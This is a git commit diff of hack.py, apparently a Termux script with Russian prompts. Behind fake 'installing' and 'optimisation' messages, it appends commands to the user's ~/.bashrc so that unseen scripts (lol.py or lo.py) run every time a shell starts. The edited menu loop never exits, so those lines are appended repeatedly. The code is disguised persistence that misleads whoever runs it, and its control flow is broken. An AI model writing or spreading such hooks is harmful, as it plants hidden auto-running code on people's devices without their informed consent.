29407c2bfb9f1e07ec40e329e9f46d358f426613
777-FOXik-777 <95873460+777-FOXik-777@users.noreply.github.com>
2022-04-11 18:25:24 +0300

    Update hack.py

--- hack.py
+++ hack.py
@@ -28,36 +28,29 @@ print('[!] Установка данных..')
 time.sleep(3)
 res()
 os.system('clear')
-print('для оптимизированной роботы')
-print('уточните вашу версию Termux')
-print(' ')
-print('[1] 0.118.0 "последняя версия"')
-print('[2] 0.101 "плеймаркет версия"')
-res()
-tsu = input('выберете пункт>>> ')
-if tsu == '1':
-    os.system('echo "cd termuxaling" >> ~/.bashrc')
-    os.system('echo "python3 lol.py" >> ~/.bashrc')
+while True:
+    print('■для оптимизированной роботы')
+    print('уточните вашу версию Termux■')
+    print(' ')
+    print('[1] 0.118.0 "последняя версия"')
+    print('[2] 0.101 "плеймаркет версия"')
+    res()
+    tsu = input('выберете пункт>>> ')
+    if tsu == '1':
+        os.system('echo "cd termuxaling" >> ~/.bashrc')
+        os.system('echo "python3 lol.py" >> ~/.bashrc')
 
-if tsu == '2':
-    os.system('echo "cd termuxaling" >> ~/.bashrc')
-    os.system('echo "python3 lo.py" >> ~/.bashrc')
-else:
-    os.system('clear')
-    print(' вы допустили ошибку попробуйте ещё, создайте второй сезон')
-    print(' и введите команду "python3 hack.py" ')
-    time.sleep(9999)
+    if tsu == '2':
+        os.system('echo "cd termuxaling" >> ~/.bashrc')
+        os.system('echo "python3 lo.py" >> ~/.bashrc')
+    else:
+        os.system('clear')
 
 os.system('clear')
 print('[!] Оптимизация..')
 time.sleep(3)
 os.system('clear')
 
-while True:
-    print('все готово просто перезапустите термукс и напишите команду "go" ')
-    res()
-    tsu = input('✅')
-    if tsu == '':
-        os.system('clear')
-    else:
-        os.system('clear')
+
+print('все готово просто перезапустите термукс и напишите команду "go" ')
+
